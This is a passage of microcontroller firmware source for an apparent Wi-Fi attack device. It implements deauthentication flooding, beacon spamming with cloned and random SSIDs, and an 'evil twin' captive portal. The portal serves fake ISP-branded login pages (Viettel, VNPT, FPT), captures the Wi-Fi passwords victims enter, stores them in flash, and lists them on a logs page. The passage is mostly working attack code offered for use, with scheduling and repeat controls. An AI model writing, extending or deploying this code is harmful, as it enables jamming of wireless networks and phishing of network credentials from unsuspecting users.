		beacon_waiting_to_start = false;
		beacon_running = true;
		beacon_pause_running = false;
		if (settime) end_time = millis() + (attack_duration * 1000);
	}
}

void startRandomBeacon(int time, bool repeat, bool enable_time, int startdelay, int pausetime, int offtime) {
	if (!isAnyNetworkSelected()) return;
	attack_duration = time;
	repeat_attack = repeat;
	settime = enable_time;
	setstarttime = (startdelay > 0);
	setpausetime = (pausetime > 0); 
	if (setpausetime) pause_duration = pausetime;
	if (offtime > 0 && !setofftime) { 
		setofftime = true;
		off_duration = offtime;
		off_time = millis() + (off_duration * 1000); 
	}
	if (setstarttime) {
		start_time = millis() + (startdelay * 1000);
		randombeacon_waiting_to_start = true; 
	} else {
		randombeacon_waiting_to_start = false;
		randombeacon_running = true;
		randombeacon_pause_running = false;
		if (settime) end_time = millis() + (attack_duration * 1000);
	}
}

void startDeauthBeacon(int time, bool repeat, bool enable_time, int startdelay, int pausetime, int offtime) {
	if (!isAnyNetworkSelected()) return;
	attack_duration = time;
	repeat_attack = repeat;
	settime = enable_time;
	setstarttime = (startdelay > 0);
	setpausetime = (pausetime > 0); 
	if (setpausetime) pause_duration = pausetime;
	if (offtime > 0 && !setofftime) { 
		setofftime = true;
		off_duration = offtime;
		off_time = millis() + (off_duration * 1000); 
	}
	if (setstarttime) {
		start_time = millis() + (startdelay * 1000);
		deauthbeacon_waiting_to_start = true; 
	} else {
		deauthbeacon_waiting_to_start = false;
		deauthbeacon_running = true;
		deauthbeacon_pause_running = false;
		if (settime) end_time = millis() + (attack_duration * 1000);
	}
}

void redirectTo(WiFiClient& client, const String& location) {
	int currentaplang = storedConfig.aplang;
	String response = "HTTP/1.1 200 OK\r\n";
	response += "Content-Type: text/html\r\n";
	response += "Connection: close\r\n";
	response += "\r\n";
	response += "<html><head>";
	response += "<meta charset='UTF-8'>";
	response += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
	response += "</head><body><h1>" + String(TRANSFERRING[currentaplang]) + "</h1>";
	response += "<p>" + String(REDIRECTED[currentaplang]) + "<a href='" + location + "'>" + String(CLICKHERE[currentaplang]) + "</a>.</p>";
	response += "<script>setTimeout(function(){window.location='" + location + "';}, 2000);</script>";
	response += "</body></html>";
	client.print(response);
}

void loop() {
	dnsServer.start();
	
	if (millis() - listenTimereset < 15000) {
		checkResetButton();
	}
	
	if (digitalRead(RESET_TRIGGER_PIN) == HIGH || (setofftime && millis() >= off_time)) {
		delay(1000);
		sys_reset();
	}
	
	WiFiClient client = server.available();
	if (client && client.connected()) {
		digitalWrite(LED_G, HIGH);
		String request = readRequest(client);
		if (request.length() > 0) {
			RequestInfo reqInfo = parseRequest(request);
			String method = reqInfo.method;
			String path = reqInfo.path;
			String query = reqInfo.query;
			if (method == "POST") {
				String body = readRequestBody(client);
				if (path == "/saveconfig" && !evilMode) {
					String newapssid = getValue(body, "apssid=", "&");
					String newappass = getValue(body, "appass=", "&");
					String channelStr = getValue(body, "apchannel=", "&");
					String langStr = getValue(body, "aplang=", "&");
					bool hidden = body.indexOf("hidden=on") != -1;
				
					newapssid = urlDecode(newapssid);
					newappass = urlDecode(newappass);
					newapssid.trim();
					newappass.trim();
				
					int newChannel = channelStr.toInt();
					int newLang = langStr.toInt();
				
					WiFiConfig storedConfig;
					FlashStorage.get(sizeof(CONFIG_SIGNATURE), storedConfig);
				
					WiFiConfig newConfig;
					if (newapssid.length() == 0) newapssid = String(storedConfig.apssid);
					if (newappass.length() == 0) newappass = String(storedConfig.appass);
					if (newChannel == 0) newChannel = storedConfig.apchannel; 
					if (newLang == 0) newLang = storedConfig.aplang;         

					newapssid.toCharArray(newConfig.apssid, sizeof(newConfig.apssid));
					newappass.toCharArray(newConfig.appass, sizeof(newConfig.appass));
					strncpy(newConfig.evilssid, storedConfig.evilssid, sizeof(newConfig.evilssid));
					newConfig.hidden = hidden;
					newConfig.apchannel = newChannel;
					newConfig.aplang = newLang;

					FlashStorage.put(0, CONFIG_SIGNATURE);
					FlashStorage.put(sizeof(CONFIG_SIGNATURE), newConfig);
					redirectTo(client, "/");
				
				} else if (path == "/post") {
					String evil_pass = getValue(body, "m=", "&");
					evil_pass = urlDecode(evil_pass);
					evil_pass.trim();
					String evil_user = getValue(body, "t=", "&");
					evil_user = urlDecode(evil_user);
					evil_user.trim();
					String evil_ssid;
					if (evil_user.length() > 0) {
						evil_ssid = evil_user;
					} else {
						evil_ssid = String(storedConfig.evilssid);
					}
					if (evil_pass.length() > 0 && 
						evil_pass.length() < sizeof(pendingWrite.evil_pass) &&
						evil_ssid.length() > 0 && 
						evil_ssid.length() < sizeof(pendingWrite.evil_ssid)) {
						pendingWrite.pending = true;
						strncpy(pendingWrite.evil_pass, evil_pass.c_str(), sizeof(pendingWrite.evil_pass) - 1);
						pendingWrite.evil_pass[sizeof(pendingWrite.evil_pass) - 1] = '\0';
						strncpy(pendingWrite.evil_ssid, evil_ssid.c_str(), sizeof(pendingWrite.evil_ssid) - 1);
						pendingWrite.evil_ssid[sizeof(pendingWrite.evil_ssid) - 1] = '\0';
						latestPassword = evil_pass;
						if (evil_user.length() > 0) {
							redirectTo(client, "/update_router");
						} else {
							redirectTo(client, "/update_evil");
						}
					}
					
				} else if (path == "/post_evilssid" && !evilMode) {
					String evilssid = getValue(body, "e=", "\n");
					evilssid = urlDecode(evilssid);
					evilssid.trim();
					if (evilssid.length() > 0) {
						strncpy(storedConfig.evilssid, evilssid.c_str(), sizeof(storedConfig.evilssid) - 1);
						storedConfig.evilssid[sizeof(storedConfig.evilssid) - 1] = '\0';
						redirectTo(client, "/evil");
						FlashStorage.put(0, CONFIG_SIGNATURE);
						FlashStorage.put(sizeof(CONFIG_SIGNATURE), storedConfig);
					}
				}
			
			} else if (method == "GET") {
				if (path == "/logo.png") {
					client.println("HTTP/1.1 200 OK");
					client.println("Content-Type: image/png");
					client.println("Content-Length: " + String(logo_png_len));
					client.println();
					client.write(logo_png, logo_png_len);
					
				} else if (path == "/viettel.png") {
					client.println("HTTP/1.1 200 OK");
					client.println("Content-Type: image/png");
					client.println("Content-Length: " + String(viettel_png_len));
					client.println();
					client.write(viettel_png, viettel_png_len);
					
				} else if (path == "/vnpt.png") {
					client.println("HTTP/1.1 200 OK");
					client.println("Content-Type: image/png");
					client.println("Content-Length: " + String(vnpt_png_len));
					client.println();
					client.write(vnpt_png, vnpt_png_len);
				
				} else if (path == "/fpt.png") {
					client.println("HTTP/1.1 200 OK");
					client.println("Content-Type: image/png");
					client.println("Content-Length: " + String(fpt_png_len));
					client.println();
					client.write(fpt_png, fpt_png_len);
					
				} else if (path == "/wifi.png") {
					client.println("HTTP/1.1 200 OK");
					client.println("Content-Type: image/png");
					client.println("Content-Length: " + String(wifi_png_len));
					client.println();
					client.write(wifi_png, wifi_png_len);
								
				} else if (path == "/evil") {
					sendEvilPage(client);
				
				} else if (path == "/evil_html" && !evilMode) {
					if (evilhtml == 1) EvilPage1(client);
					else if (evilhtml == 2) EvilPage2(client);
					else if (evilhtml == 3) EvilPage3(client);
					else if (evilhtml == 4) EvilPage4(client);
					else if (evilhtml == 5) EvilPage5(client);
					else if (evilhtml == 6) EvilPage6(client);
				
				} else if (path == "/update_evil") {
					updateEvilPage(client);
					client.stop();
					if (evilMode && latestPassword.length() > 0) {
						shouldRunEvilConnect = true;
					}
				} else if (path == "/update_router") {
					updateRouterPage(client);
					client.stop();			
				} else if (path == "/start_evil" && !evilMode) {
					int currentaplang = storedConfig.aplang;
					String response = "HTTP/1.1 200 OK\r\n";
					response += "Content-Type: text/html\r\n";
					response += "Connection: close\r\n";
					response += "\r\n";
					response += "<html><head>";
					response += "<meta charset='UTF-8'>";
					response += "</head><body><h1>" + String(SWITCHINGEVIL[currentaplang]) + "</h1>";
					response += "</body></html>";
					client.print(response);
					status = WiFi.begin(storedConfig.evilssid, (char *)latestPassword.c_str());
					while (status != WL_CONNECTED) {
						status = WiFi.apbegin(storedConfig.evilssid, (char *)String(storedConfig.apchannel).c_str());
					}
					evilMode = true;
				
				} else if (path == "/sys_reset") {
					sys_reset();
				
				} else if (path == "/logs") {
					sendLogsPage(client);
				
				} else if (path == "/clearlogs" && !evilMode) {
					passwordCount = 0;
					FlashStorage.put(PASSWORDS_OFFSET, PASSWORDS_SIGNATURE);
					FlashStorage.put(PASSWORDS_OFFSET + sizeof(PASSWORDS_SIGNATURE), passwordCount);
					redirectTo(client, "/logs");
				
				} else if (path == "/blue" && !evilMode) {
					sendBluePage(client);
				
				} else if (path == "/off_blue" && !evilMode) {
					digitalWrite(OFF_BLUE_PIN, HIGH);
					delay(100);
					digitalWrite(OFF_BLUE_PIN, LOW);
				
				} else if (path == "/on_blue" && !evilMode) {
					digitalWrite(ON_BLUE_PIN, HIGH);
					delay(100);
					digitalWrite(ON_BLUE_PIN, LOW);
				
				} else if (path == "/time" && !evilMode) {
					String response = makeResponse(200, "text/plain") + 
					String(millis()) + "," + 
					String(start_time) + "," + 
					String(deauth_waiting_to_start);
					client.write(response.c_str());
			
				} else if (path == "/set_evilhtml" && query.length() > 0 && !evilMode) {
					String evilhtmlStr = getValue(query, "evilhtml=", " ");
					if (evilhtmlStr == "1") evilhtml = 1;
					else if (evilhtmlStr == "2") evilhtml = 2;
					else if (evilhtmlStr == "3") evilhtml = 3;
					else if (evilhtmlStr == "4") evilhtml = 4;
					else if (evilhtmlStr == "5") evilhtml = 5;
					else if (evilhtmlStr == "6") evilhtml = 6;
			
				} else if (path == "/set_reason" && query.length() > 0 && !evilMode) {
					String reasonStr = getValue(query, "reason=", " ");
					if (reasonStr == "0x02") deauth_reason = 0x02;
					else if (reasonStr == "0x04") deauth_reason = 0x04;
					else if (reasonStr == "0x07") deauth_reason = 0x07;
				
				} else if (path == "/updateSelection" && query.length() > 0 && !evilMode) {
					updateSelection(client, request); 
				
				} else if ((path == "/buttonA" || path == "/buttonB" || path == "/buttonC" || path == "/buttonD") &&
					(!evilMode || !deauth_running || !beacon_running || !randombeacon_running || !deauthbeacon_running)) {
					bool repeat = getValue(query, "repeat=", "&").toInt();
					int time = getValue(query, "time=", "&").toInt();
					int settime = getValue(query, "settime=", " ").toInt();
					int start_delay = getValue(query, "starttime=", " ").toInt();
					int pausetime = getValue(query, "pausetime=", " ").toInt();
					int offtime = getValue(query, "offtime=", " ").toInt();
					if (time > 0 || !settime) {
						if (path == "/buttonA") startDeauth(time, repeat, settime, start_delay, pausetime, offtime);
						else if (path == "/buttonB") startBeacon(time, repeat, settime, start_delay, pausetime, offtime);
						else if (path == "/buttonC") startRandomBeacon(time, repeat, settime, start_delay, pausetime, offtime);
						else if (path == "/buttonD") startDeauthBeacon(time, repeat, settime, start_delay, pausetime, offtime);
					}
					client.stop();
				
				} else if (path == "/buttonE" && !evilMode) {
					redirectTo(client, "/");
					if (scanNetworksAsync()) {
						delay(1);
						client.stop();
						return;
					}
				
				} else if (path == "/buttonF" && !evilMode) {
					deauth_running = false;
					beacon_running = false;
					randombeacon_running = false;
					deauthbeacon_running = false;
				
					settime = false;
					setstarttime = false;
					setpausetime = false;
					setofftime = false;
					repeat_attack = false;				
				
					deauth_waiting_to_start = false;
					beacon_waiting_to_start = false;
					randombeacon_waiting_to_start = false;
					deauthbeacon_waiting_to_start = false;
				
					deauth_pause_running = false;
					beacon_pause_running = false;
					randombeacon_pause_running = false;
					deauthbeacon_pause_running = false;	
				
					client.stop();
					digitalWrite(LED_R, HIGH);
				
				} else if (evilMode) {
					if (client.available()) {
						if (evilhtml == 1) EvilPage1(client);
						else if (evilhtml == 2) EvilPage2(client);
						else if (evilhtml == 3) EvilPage3(client);
						else if (evilhtml == 4) EvilPage4(client);
						else if (evilhtml == 5) EvilPage5(client);
						else if (evilhtml == 6) EvilPage6(client);
					} else {
						redirectTo(client, "/");
					}
				
				} else if (path == "/") {
					if (client.available()) {
						currentHeap = xPortGetFreeHeapSize();
						delay(1);
						sendHomePage(client, currentHeap);
					} else {
						redirectTo(client, "/");
					}
				
				} else {
					redirectTo(client, "/");
					
				}
			}
		}
		delay(1);
		client.stop();
		digitalWrite(LED_G, LOW);
	}
	
	if (pendingWrite.pending) {
		if (passwordCount < MAX_PASSWORDS) {
			strncpy(passwordList[passwordCount].evil_pass, pendingWrite.evil_pass, sizeof(passwordList[passwordCount].evil_pass) - 1);
			passwordList[passwordCount].evil_pass[sizeof(passwordList[passwordCount].evil_pass) - 1] = '\0';
			strncpy(passwordList[passwordCount].evil_ssid, pendingWrite.evil_ssid, sizeof(passwordList[passwordCount].evil_ssid) - 1);
			passwordList[passwordCount].evil_ssid[sizeof(passwordList[passwordCount].evil_ssid) - 1] = '\0';
			passwordCount++;
		} else {
			for (int i = 0; i < MAX_PASSWORDS - 1; i++) {
				passwordList[i] = passwordList[i + 1];
			}
			strncpy(passwordList[MAX_PASSWORDS - 1].evil_pass, pendingWrite.evil_pass, sizeof(passwordList[MAX_PASSWORDS - 1].evil_pass) - 1);
			passwordList[MAX_PASSWORDS - 1].evil_pass[sizeof(passwordList[MAX_PASSWORDS - 1].evil_pass) - 1] = '\0';
			strncpy(passwordList[MAX_PASSWORDS - 1].evil_ssid, pendingWrite.evil_ssid, sizeof(passwordList[MAX_PASSWORDS - 1].evil_ssid) - 1);
			passwordList[MAX_PASSWORDS - 1].evil_ssid[sizeof(passwordList[MAX_PASSWORDS - 1].evil_ssid) - 1] = '\0';
		}
		FlashStorage.put(PASSWORDS_OFFSET, PASSWORDS_SIGNATURE);
		FlashStorage.put(PASSWORDS_OFFSET + sizeof(PASSWORDS_SIGNATURE), passwordCount);
		FlashStorage.put(PASSWORDS_OFFSET + sizeof(PASSWORDS_SIGNATURE) + sizeof(passwordCount), passwordList);
		pendingWrite.pending = false;
	}
	
	if (shouldRunEvilConnect) {
		static bool triedConnect = false;

		if (!triedConnect) {
			status = WiFi.begin(storedConfig.evilssid, (char *)latestPassword.c_str());
			if (WiFi.status() == WL_CONNECTED) {
				sys_reset(); 
			} else {
				while (status != WL_CONNECTED) {
					status = WiFi.apbegin(storedConfig.evilssid, (char *)String(storedConfig.apchannel).c_str());
				}	
			}
			triedConnect = true;	
		}
	
		shouldRunEvilConnect = false;
		triedConnect = false;
	}
	
	if (deauth_waiting_to_start && millis() >= start_time) {
		deauth_waiting_to_start = false;
		deauth_running = true;
		deauth_pause_running = false;
		if (settime) end_time = millis() + (attack_duration * 1000);
	}
	
	if (beacon_waiting_to_start && millis() >= start_time) {
		beacon_waiting_to_start = false;
		beacon_running = true;
		beacon_pause_running = false;
		if (settime) end_time = millis() + (attack_duration * 1000);
	}
	
	if (randombeacon_waiting_to_start && millis() >= start_time) {
		randombeacon_waiting_to_start = false;
		randombeacon_running = true;
		randombeacon_pause_running = false;
		if (settime) end_time = millis() + (attack_duration * 1000);
	}
	
	if (deauthbeacon_waiting_to_start && millis() >= start_time) {
		deauthbeacon_waiting_to_start = false;
		deauthbeacon_running = true;
		deauthbeacon_pause_running = false;
		if (settime) end_time = millis() + (attack_duration * 1000);
	}
	
	if (deauth_running && scan_results.size() > 0) {
		digitalWrite(LED_R, LOW);
		digitalWrite(LED_B, HIGH);
		if (digitalRead(PAUSE_PIN) == HIGH || digitalRead(RESET_TRIGGER_PIN) == HIGH || (setofftime && millis() >= off_time)) {
			deauth_running = false; 
			return;
		}
		if (settime && millis() >= end_time) {
			deauth_running = false;
			digitalWrite(LED_B, LOW);
			if (repeat_attack) {
				deauth_pause_running = true;
				pause_time = millis() + (setpausetime ? (pause_duration * 1000) : (attack_duration * 1000));
			} else sys_reset();
			return;
		}
		for (size_t j = 0;j < scan_results.size();j++) {	
			if (scan_results[j].selected) {
				int targetChannel = scan_results[j].channel;
				wifi_set_channel(targetChannel);
				memcpy(deauth_bssid, scan_results[j].bssid, 6);
				for (int x=0;x < frames_per_deauth;x++) {
					wifi_tx_deauth_frame(deauth_bssid, broadcast_mac, deauth_reason);
					delay(1);
					wext_set_channel(WLAN0_NAME, storedConfig.apchannel);
				}
			}
		}	
		digitalWrite(LED_B, LOW);
		
	} else if (beacon_running && scan_results.size() > 0) {
		digitalWrite(LED_R, LOW);
		digitalWrite(LED_B, HIGH);
		if (digitalRead(PAUSE_PIN) == HIGH || digitalRead(RESET_TRIGGER_PIN) == HIGH || (setofftime && millis() >= off_time)) {
			beacon_running = false; 
			return;
		}
		if (settime && millis() >= end_time) {
			beacon_running = false;
			digitalWrite(LED_B, LOW);
			if (repeat_attack) {
				beacon_pause_running = true;
				pause_time = millis() + (setpausetime ? (pause_duration * 1000) : (attack_duration * 1000));
			} else sys_reset();
			return;
		}
		for (size_t j = 0;j < scan_results.size();j++) {	
			if (scan_results[j].selected) {
				const char *beacon_ssid = (scan_results[j].ssid).c_str();
				memcpy(deauth_bssid, scan_results[j].bssid, 6);
				for (int x=0;x < frames_per_deauth;x++) {
					wifi_tx_beacon_frame(deauth_bssid, broadcast_mac, beacon_ssid);
					delay(1);
					wext_set_channel(WLAN0_NAME, storedConfig.apchannel);
				}
			}
		}
		digitalWrite(LED_B, LOW);
		
	} else if (randombeacon_running && scan_results.size() > 0) {
		digitalWrite(LED_R, LOW);
		digitalWrite(LED_B, HIGH);
		if (digitalRead(PAUSE_PIN) == HIGH || digitalRead(RESET_TRIGGER_PIN) == HIGH || (setofftime && millis() >= off_time)) {
			randombeacon_running = false; 
			return;
		}
		if (settime && millis() >= end_time) {
			randombeacon_running = false;
			digitalWrite(LED_B, LOW);
			if (repeat_attack) {
				randombeacon_pause_running = true;
				pause_time = millis() + (setpausetime ? (pause_duration * 1000) : (attack_duration * 1000));
			} else sys_reset();
			return;
		}
		for (size_t j = 0;j < scan_results.size();j++) {	
			if (scan_results[j].selected) {
				String random_ssid = generaterandom_ssid(10);
				const char *beacon_random_ssid = random_ssid.c_str();
				for (size_t i=0;i<6;i++) {
					byte randomByte = random(0x00, 0xFF);
					snprintf(random_bssid + i * 3, 4, "\\x%02X", randomByte);
				}
				memcpy(deauth_bssid, scan_results[j].bssid, 6);
				for (int x=0;x < frames_per_deauth;x++) {
					wifi_tx_beacon_frame(random_bssid, broadcast_mac, beacon_random_ssid);
					wifi_tx_beacon_frame(deauth_bssid, broadcast_mac, beacon_random_ssid);
					delay(1);
					wext_set_channel(WLAN0_NAME, storedConfig.apchannel);
				}
			}
		}
		digitalWrite(LED_B, LOW);
		
	} else if (deauthbeacon_running && scan_results.size() > 0) {
		digitalWrite(LED_R, LOW);
		digitalWrite(LED_B, HIGH);
		if (digitalRead(PAUSE_PIN) == HIGH || digitalRead(RESET_TRIGGER_PIN) == HIGH || (setofftime && millis() >= off_time)) {
			deauthbeacon_running = false; 
			return;
		}
		if (settime && millis() >= end_time) {
			deauthbeacon_running = false;
			digitalWrite(LED_B, LOW);
			if (repeat_attack) {
				deauthbeacon_pause_running = true;
				pause_time = millis() + (setpausetime ? (pause_duration * 1000) : (attack_duration * 1000));
			} else sys_reset();
			return;
		}
		for (size_t j = 0;j < scan_results.size();j++) {					
			if (scan_results[j].selected) {
				const char *beacon_ssid = (scan_results[j].ssid).c_str();
				int targetChannel = scan_results[j].channel;
				wifi_set_channel(targetChannel);
				memcpy(deauth_bssid, scan_results[j].bssid, 6);
				for (int x=0;x < frames_per_deauth;x++) {
					wifi_tx_deauth_frame(deauth_bssid, broadcast_mac, deauth_reason);
					wifi_tx_beacon_frame(deauth_bssid, broadcast_mac, beacon_ssid);
					delay(1);
					wext_set_channel(WLAN0_NAME, storedConfig.apchannel);
				}
			}
		}
		digitalWrite(LED_B, LOW);
	}
	
	if ((deauth_pause_running && repeat_attack && millis() >= pause_time) || digitalRead(START_PIN) == HIGH) {
		startDeauth(attack_duration, repeat_attack, settime, 0, pause_duration, 0);
	}
	
	if ((beacon_pause_running && repeat_attack && millis() >= pause_time) || digitalRead(START_PIN) == HIGH) {
		startBeacon(attack_duration, repeat_attack, settime, 0, pause_duration, 0);
	}
	
	if ((randombeacon_pause_running && repeat_attack && millis() >= pause_time) || digitalRead(START_PIN) == HIGH) {
		startRandomBeacon(attack_duration, repeat_attack, settime, 0, pause_duration, 0);
	}
	
	if ((deauthbeacon_pause_running && repeat_attack && millis() >= pause_time) || digitalRead(START_PIN) == HIGH) {
		startDeauthBeacon(attack_duration, repeat_attack, settime, 0, pause_duration, 0);
	}
}